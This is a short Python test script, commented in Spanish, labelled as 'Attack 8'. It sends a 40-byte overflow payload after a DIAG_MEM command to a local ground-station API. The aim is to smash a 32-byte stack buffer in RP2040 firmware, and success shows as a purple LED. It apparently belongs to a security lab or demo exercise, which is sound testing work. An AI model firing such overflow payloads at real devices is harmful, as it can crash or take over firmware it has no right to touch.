#!/usr/bin/env python3
"""
Prueba Individual - Ataque 8: Desbordamiento de Pila en Firmware (DIAG_MEM)
Envía un payload de 40 bytes para sobreescribir la pila de memoria en el RP2040.
"""
import requests

BASE_URL = "http://localhost:5000"

def test_attack_8():
    print("[+] Ejecutando Prueba Individual: Ataque 8 - Firmware Stack Overflow (DIAG_MEM)...")
    overflow_data = "DIAG_MEM " + ("A" * 40)
    hex_payload = overflow_data.encode('utf-8').hex()
    url = f"{BASE_URL}/api/radio/send"
    try:
        response = requests.post(url, json={"data": hex_payload}, timeout=5)
        print(f"[*] POST {url} (payload > 32 bytes) - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Payload de desbordamiento enviado! Verifica que el NeoPixel LED cambie a color PÚRPURA.")
            print(response.json())
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_8()
